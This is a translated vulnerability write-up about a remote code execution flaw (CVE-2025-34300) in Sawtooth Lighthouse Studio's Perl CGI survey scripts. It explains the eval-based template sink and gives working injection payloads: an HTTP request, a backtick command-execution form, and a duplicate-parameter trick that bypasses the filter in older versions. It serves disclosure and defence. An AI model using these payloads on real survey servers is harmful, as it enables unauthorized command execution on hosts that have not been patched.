> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzAxODM5ODQzNQ==&mid=2247489623&idx=1&sn=35978a7efb9a7ed2dffcccade99bc7e2

#  你从未听说过的最流行调查软件中的远程代码执行漏洞 (RCE)  
Adam Kues  securitainment   2025-07-19 09:08  
  
> RCE IN THE MOST POPULAR SURVEY SOFTWARE YOU’VE NEVER HEARD OF  
  
> 免责声明：本博客文章仅用于教育和研究目的。提供的所有技术和代码示例旨在帮助防御者理解攻击手法并提高安全态势。请勿使用此信息访问或干扰您不拥有或没有明确测试权限的系统。未经授权的使用可能违反法律和道德准则。作者对因应用所讨论概念而导致的任何误用或损害不承担任何责任。  
  
  
你是否见过邀请参与调研的弹窗？是否收到过请求提供宝贵意见的邮件？很可能你已经使用过由 Sawtooth Software 开发的调查软件 Lighthouse Studio。（如果你想确认，可以在邮件中搜索
```
ciwweb
```

  
——结果可能会让你惊讶。）  
  
Lighthouse Studio 软件由两部分组成：第一部分是桌面应用程序，供调查创建者设置问题、响应格式和其他调查参数。这部分通常不会暴露给攻击者，因此不是本文的重点。第二部分则是一组 Perl CGI 脚本，这些脚本会被上传到公司网站，供用户参与调查。  
  
在 Assetnote，我们始终致力于保护客户的攻击面，而审计这些老派 Perl 代码的机会实在不容错过。此外，这些脚本的潜在影响巨大，因为它们没有自动更新机制，且经常被复制到不同的调查中。单个公司可能在其 Web 服务器上部署了数十甚至数百份这些脚本的副本。  
  
本文将详细介绍一个漏洞，该漏洞允许任何拥有调查链接的用户在托管这些脚本的 Web 服务器上实现远程代码执行（Remote Code Execution, RCE）。  
## 源码逆向工程  
  
Lighthouse Studio 的安装程序可免费获取。在 Windows 虚拟机中安装该软件后，我们在
```
Server/cgi-bin
```

  
目录下找到了服务器脚本：  

```
cgi-bin % ls
AdminMiddlewares9_16_12.pl
BetaFeatures9_16_12.pl
Database9_16_12.pl
DesignFileReader9_16_12.pl
JS9_16_12.pl
Middlewares9_16_12.pl
ObjectToJson9_16_12.pl
Path9_16_12.pl
PseudoJWT9_16_12.pl
acalib9_16_12.pl
acbclib9_16_12.pl
admin.pl
authlib9_16_12.pl
cbclib9_16_12.pl
cgicookies9_16_12.pl
ciwlib9_16_12.pl
ciwweb.pl
cookies9_16_12.pl
cvalib9_16_12.pl
enterlib9_16_12.pl
environment9_16_12.pl
grdlib9_16_12.pl
jshelpers9_16_12.pl
libs9_16_12.pl
lite9_16_12.pl
maxdifflib9_16_12.pl
nonceinserter9_16_12.pl
perltools.pl
pverlib9_16_12.pl
sortnaturally9_16_12.pl
stringrandom9_16_12.pl
template9_16_12.pl
update9_16_12.pl
```

  
需要注意的是，虽然桌面软件仅支持 Windows 平台，但服务器 CGI 脚本可以在任何平台上运行，且通常部署在 Linux Apache + mod_cgi 的环境中。  
  
查看这些脚本后，可以明显发现它们经过了代码混淆（minified）。每个文件中的变量和子程序名称都被替换，且所有代码都写在一行中：  

```
#!/usr/bin/perl
# ---------------------------------------------------------------------------
#   ciwweb.pl
#   Build: 1741704348952
#   Ver: 9_16_12
# ---------------------------------------------------------------------------
# Lighthouse Studio - Web Surveying System
# Copyright Sawtooth Software, Inc. 1998-2025. All rights reserved.
# Provo, UT  USA  (801) 477-4700
#
# Any modification of this script will be considered violation of
# copyright (with the exception of the first line which can be
# modified to reflect the correct path to the Perl interpreter)
#
# Any use of this script or its code for purposes outside of
# the systems created by Sawtooth Software is prohibited.
# ---------------------------------------------------------------------------
use strict; package ssiwebciw9_16_12; if (exists($ENV{'MOD_PERL'}) && defined($ENV{'MOD_PERL'})) { ssiwebciw9_16_12::_qg(); } else { $SIG{&#34;ALRM&#34;} = \&ssiwebciw9_16_12::_qh; ...
```

  
为了让代码更易读，我们可以使用 
```
Perl::Tidy
```

  
   
来合理格式化代码：  

```
# ... snip prolog ...
package ssiwebciw9_16_12;
if ( exists( $ENV{'MOD_PERL'} ) && defined( $ENV{'MOD_PERL'} ) ) {
    ssiwebciw9_16_12::_iaa();
}
else {
    $SIG{&#34;ALRM&#34;} = \&ssiwebciw9_16_12::_iab;
    eval { alarm(180); ssiwebciw9_16_12::_iaa(); alarm(0); };
    if ($@) {
        my $_aur = $@;
        eval {
            if ( $_aur =~ m/Sawtooth Software process time out/i ) {
                my $_iag = &#34;Process timed out.&#34;;
                authlib9_16_12::_foj( 312, $_iag, $_iag, $@, 0 );
            }
            else { authlib9_16_12::_foj( 313, &#34;&#34;, &#34;&#34;, $_aur, 0 ); }
        };
        if ($@) { die(&#34;Sawtooth Software Error.&#34;); }
    }
}


# ...
```

  
我们仍然有大量混淆代码。如何理解它的功能？如果你关注最新的逆向工程趋势，可能会知道人们正在成功应用 AI 进行逆向工程。考虑到现在是 2025 年，AI 软件已经拥有数百万的 token 上下文，我们决定使用 Google Gemini 来尝试反混淆源代码。通过适当的提示和给定的源代码，AI 生成了一个非常值得称赞的可读版本：  
  
对于以下原始代码：  

```
     if ( exists $authlib9_16_12::_fuv{&#34;s&#34;} ) {
        my $_qj = $authlib9_16_12::_fuv{&#34;s&#34;};
        $_qj =~ s/(\d{2})/$1,/g;
        my @_qk = split( &#34;,&#34;, $_qj );
        my @_ql = map { chr( $_ + 30 ) } @_qk;
        my @_qm = split( &#34;&&#34;, join( &#34;&#34;, @_ql ) );
        foreach my $_qn (@_qm) {
            my ( $_hf, $_aa ) = split( &#34;=&#34;, $_qn );
            $authlib9_16_12::_fuv{$_hf} = $_aa;
        }
    }
```

  
Gemini 生成了类似这样的代码：  

```
# Handle special 's=' parameter encoding (used for embedding params in links?)
if (exists $AuthLib::g_form_input{&#34;s&#34;}) {
    parse_s_parameter($AuthLib::g_form_input{&#34;s&#34;}); # Original: _adw
}


# ...


# --- Helper: Parse 's=' Parameter ---
# Decodes URL parameters embedded in the 's' parameter value.
sub parse_s_parameter { # Original: _adw
    my ($encoded_string) = @_; # Original: _qj
    return unless $encoded_string;


    # 1. Decode numeric encoding back to characters
    # e.g., &#34;707172&#34; -> &#34;70,71,72,&#34; -> [70, 71, 72] -> [chr(100), chr(101), chr(102)] -> &#34;def&#34;
    $encoded_string =~ s/(\d{2})/$1,/g; # Add commas
    my @char_codes = split(&#34;,&#34;, $encoded_string);
    my @chars = map { chr($_ + 30) } grep { /^\d+$/ } @char_codes; # Convert code to char (offset 30)
    my $decoded_params = join(&#34;&#34;, @chars);


    # 2. Split into key=value pairs
    my @param_pairs = split(&#34;&&#34;, $decoded_params); # Original: _qm
    my $pair; # Original: _qn
    foreach $pair (@param_pairs) {
        my ($key, $value) = split(&#34;=&#34;, $pair, 2); # Split on first '=' only Original: _hf, _aa
        if (defined $key && defined $value) {
            # URL Decode key and value? Original didn't show decoding here. Assume already decoded.
            # Store in global form input hash, potentially overwriting existing values
            $AuthLib::g_form_input{$key} = $value;
        }
    }
}
```

  
反混淆后的代码并不完美（
```
grep { /^\d+$/ }
```

  
完全是 AI 的臆想，生成的代码做了很多原始代码没有的防御性检查），但 AI 在映射最常用函数方面帮助很大，比如识别出 
```
_fuv
```

  
是表单输入。由于 AI 修改代码的方式可能会影响其安全性，我们仅将 AI 代码作为参考来获得大致概览，并直接对原始源代码进行分析。  
## 漏洞发现  
  
实现远程代码执行（Remote Code Execution, RCE）最简单的方法之一就是让用户输入到达 eval 执行点。我们很快发现了一个有潜力的执行点：  

```
sub _fop {
    my ( $_ls, $_gve ) = @_;
    my $_ghf = &#34;&#34;;
    my $_ghg = &#34;&#34;;
    while ( $_ls =~ m/\[%(.*?)%\]/sg ) {
        $_ghf = $1;
        if ($_gve) { $_ghf =~ s/\\'/'/sg; $_ghf =~ s/\\\\/\\/sg; }
        $_ghg = _foq( $_ghf, &#34;Lighthouse Studio Scripting&#34; );
        $_ghg =~ s/\[%(.*?)%\]/$1/sg;
        if ($_gve) { $_ghg =~ s/\\/\\\\/sg; $_ghg =~ s/'/\\'/sg; }
        $_ls =~ s/\[%(.*?)%\]/$_ghg/s;
    }
    return nonceinserter9_16_12::_lj($_ls);
}


sub _foq {
    my ( $_gtp, $_gvf ) = @_;
    my $_ejf = &#34;&#34;;
    $_ejf = eval($_gtp);
    if ( $authlib9_16_12::_qd && ( $_ejf eq &#34;&#34; || $@ ) ) {
        $_ejf = &#34;<span class=script_preview>[Script]</span>&#34;;
    }
    elsif ($@) {
        authlib9_16_12::_foj(
            132,
            &#34;Script error.&#34;,
            &#34;There is an error in &#34; . $_gvf . &#34;: Script:&#34; . $_gtp, $@
        );
    }
    else { return $_ejf; }
}
```

  

```
_fop
```

  
子程序实现了一个简单的模板引擎（templating engine）。任何位于 
```
[% … %]
```

  
之间的内容都会被传递给 
```
_foq
```

  
并作为 Perl 代码执行。  
  
看到这里，我们立即想知道这个模板系统在何处被使用。结果发现它在应用程序中无处不在，包括一些可能接收用户输入的地方。我们很快在 
```
ciwweb.pl
```

  
中发现了一个可能的漏洞点（sink），这是所有用户调查的入口点：  

```
$_lw = '';


# ... snip ...


if ( exists $authlib9_16_12::_fuv{&#34;hid_Random_ACARAT&#34;} ) {
    $_lw .=
      &#34;\n<input type=\&#34;hidden\&#34; name=\&#34;hid_Random_ACARAT\&#34; value=\&#34;&#34;
      . $authlib9_16_12::_fuv{&#34;hid_Random_ACARAT&#34;} . &#34;\&#34;>\n&#34;;
}


# ... snip ...


$ciwlib9_16_12::_qg = 1;
$_lw                = authlib9_16_12::_fop( $_lw, 0 );
```

  
调查页面的渲染方式存在安全缺陷：所有用户输入替换先执行，然后才调用 
```
_fop
```

  
模板引擎。在调用 
```
_fop
```

  
时，
```
_lw
```

  
变量包含了整个页面的 HTML 源码。这种处理方式明显不安全，我们很快就在示例目标中附加了 
```
?hid_Random_ACARAT=[%257*7%25]
```

  
参数进行测试：  

```
GET /ExampleSurvey/cgi-bin/ciwweb.pl?hid_javascript=1&hid_Random_ACARAT=[%257*7%25] HTTP/2
Host: example.com
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br


...


HTTP/2 200 OK
Date: Thu, 17 Apr 2025 01:20:43 GMT
Content-Type: text/html


...


<input type=&#34;hidden&#34; name=&#34;hid_javascript&#34; value=&#34;0&#34;>
<input type=&#34;hidden&#34; name=&#34;hid_previous&#34; value=&#34;0&#34;>
<input type=&#34;hidden&#34; id=&#34;hid_screenwidth&#34; name=&#34;hid_screenwidth&#34; value=&#34;0&#34;>


<input type=&#34;hidden&#34; name=&#34;hid_Random_ACARAT&#34; value=&#34;49&#34;>


<input type=&#34;hidden&#34; name=&#34;hid_show_prev&#34; value=&#34;1&#34;>
<div class=&#34;page_header font_primary_color&#34;>


...
```

  
成功！我们可以轻松地通过在反引号中传递命令来升级此漏洞，使用：  

```
[% %60ls%60 %]
```

  
注意：由于博客格式限制，上面的反引号进行了 URL 编码。  
## 使漏洞利用更可靠  
  
在分析多个主机时，我们发现运行 9.15.x 版本（该版本非常常见）的旧版主机上，我们的 payload 会失效。系统似乎在
```
[
```

  
和
```
%
```

  
之间插入了空格，导致注入失败：  

```
<input type=&#34;hidden&#34; name=&#34;hid_Random_ACARAT&#34; value=&#34;[ %7*7%]&#34;>
```

  
该防护机制在新版本中似乎已被移除。为了绕过这个限制，我们查看了软件旧版本的一些代码，其中包含了额外的安全检查。在这个旧版本中，它使用了不同的混淆方式，因此我们的查询参数位于 
```
%authlib9_14_2::_akn
```

  
中。  

```
sub _xi {
    my ($__bhr) = @_;
    my $__bhh   = &#34;&#34;;
    my $__bhi   = &#34;&#34;;
    my $__bhj   = 0;
    my $__bhk   = &#34;&#34;;
    foreach $__bhh ( sort keys(%authlib9_14_2::_akn) ) {
        $__bhi = $authlib9_14_2::_akn{$__bhh};
        if ( !$__bhr ) { $__bhi =~ s/</ < /g; $__bhi =~ s/>/ > /g; }
        $__bhi =~ s/onbegin/on begin/ig;
        $__bhi =~ s/<(\s*)script/<$1 s c r i p t/ig;
        $__bhi =~ s/javascript/j a v a _ s c r i p t/ig;
        $__bhi =~ s/\[%/\[ %/ig;
        $authlib9_14_2::_akn{$__bhh} = $__bhi;
        if ( !$__bhr && ref($__bhi) eq &#34;ARRAY&#34; ) {
            $__bhj                       = $__bhi;
            $__bhi                       = $__bhj->[0];
            $authlib9_14_2::_akn{$__bhh} = $__bhi;
            my $__bhl = @{$__bhj};
            my $__bhm = 0;
            my $__bhn = $__bhj->[0];
            my $__bho = 0;
            for ( $__bhm = 1 ; $__bhm < $__bhl ; $__bhm++ ) {
                if ( $__bhn ne $__bhj->[$__bhm] ) { $__bho = 1; last; }
            }
            if ($__bho) {
                $__bhk .=
                    &#34;Found Null character in the %in hash. Key: &#34;
                  . $__bhh
                  . &#34; Value: &#34;
                  . join( &#34; | &#34;, @{$__bhj} );
            }
        }


        // .. snip ..
    }


    // .. snip ..


}
```

  
对于不熟悉 Perl 的读者，这里 
```
$__bhh
```

  
是查询键 (query key)，
```
$__bhi
```

  
是查询值 (query value)。关键代码 
```
$__bhi =~ s/\[%/\[ %/ig;
```

  
正在执行主要的防护工作，阻止了我们的漏洞利用 (exploit)。然而，继续往下看，我们发现了一些有趣的东西：  

```
f ( !$__bhr && ref($__bhi) eq &#34;ARRAY&#34; ) {
            $__bhj                       = $__bhi;
            $__bhi                       = $__bhj->[0];
            $authlib9_14_2::_akn{$__bhh} = $__bhi;
```

  
如果查询值实际上是一个数组（即传递了多个相同键的值），它只会将其设置为数组的第一个值。那么这与上面的替换操作如何协同工作呢？
```
s
```

  
操作符如何处理数组引用 (array ref)？让我们启动 Perl 解释器来测试一下：  

```
$a = ['foobar', 'x'];
$a =~ s/foobar/123/;
print $a->[0]; # foobar
```

  
没错，当 
```
$__bhi
```

  
是数组引用 (array ref) 时，替换操作会被完全忽略！因此我们可以通过传递两次查询参数来绕过这个防护，实际上传递 
```
hid_Random_ACARAT=[%257*7%25]&hid_Random_ACARAT=x
```

  
在所有版本的目标上都有效。  
  
经过这次分析，我们得到了一个在几乎所有"野外"版本中都能有效利用的 payload！  
## 结论  
  
我们于 2025 年 4 月 9 日向 Sawtooth Software 报告了这个漏洞。版本 9.16.14 已经发布以修复该问题，受影响的用户应尽快更新。该漏洞已被分配 CVE-2025-34300。  
  
